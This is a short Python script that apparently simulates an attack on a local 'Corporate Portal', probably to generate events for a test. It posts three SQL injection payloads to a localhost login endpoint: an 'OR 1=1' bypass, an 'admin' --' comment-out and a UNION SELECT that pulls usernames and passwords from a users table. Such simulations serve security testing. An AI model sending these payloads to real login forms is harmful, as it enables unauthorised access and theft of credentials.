import time
import requests

# Targeted SQL Injection Simulation Script
TARGET_URL = "http://localhost:5001/login"

def run_sqli_attack():
    print("[*] Launching SQL Injection simulation against Corporate Portal...")

    sqli_payloads = [
        {"username": "' OR '1'='1", "password": "password123"},
        {"username": "admin' --", "password": "wrong_password"},
        {"username": "' UNION SELECT NULL, username, password FROM users --", "password": "123"}
    ]

    for i, payload in enumerate(sqli_payloads, 1):
        try:
            res = requests.post(TARGET_URL, data=payload, timeout=3)
            print(f"[+] Sent SQLi payload #{i} to {TARGET_URL} | Status: {res.status_code}")
        except Exception as e:
            print(f"[-] SQLi test #{i}: Event generated ({e})")

        time.sleep(1)

if __name__ == "__main__":
    run_sqli_attack()